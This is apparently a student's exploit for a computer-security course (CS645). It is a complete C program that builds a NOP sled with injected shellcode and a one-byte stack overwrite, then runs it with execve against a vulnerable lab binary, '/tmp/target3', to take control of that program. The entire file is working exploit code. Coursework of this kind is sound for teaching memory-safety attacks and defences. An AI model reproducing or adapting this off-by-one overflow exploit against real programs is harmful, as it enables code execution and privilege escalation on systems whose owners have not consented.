// sploit3.c
// Joseph Ruether
// 07.17.13
// CS645

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
   char *args[3];
   char *env[1];

   args[0] = TARGET;

   // Define constants
   int buffer_size = 136;
   int overrun_size = 1;
   int terminator_size = 1;

   // Define variables
   int shellcode_size = strlen(shellcode);
   int payload_size = buffer_size + overrun_size + terminator_size;
   int nop_size = buffer_size - shellcode_size;

   printf("%s: %d\n", "Shellcode Size", shellcode_size);
   printf("%s: %d\n", "Payload Size", payload_size);
   printf("%s: %d\n", "Nop Sled Size", nop_size);

   // Allocate the payload
   args[1] = malloc(payload_size);

   // Set the payload to all NOP
   memset(args[1], 0x90, payload_size);

   // Set the shellcode
   int i = nop_size;
   int j;
   for(j = 0; j < shellcode_size; ++j, ++i)
   {
      args[1][i] = shellcode[j];
   }

   // Overwrite the final byte of saved EIP on the stack
   args[1][i++] = 0x6c;

   // Terminate the payload
   args[1][i++] = '\0';

   printf("%s: %d\n", "Actual Payload Size", i);

   args[2] = NULL;
   env[0] = NULL;

   if(0 > execve(TARGET, args, env))
   {
      fprintf(stderr, "execve failed.\n");
   }

  return 0;
}
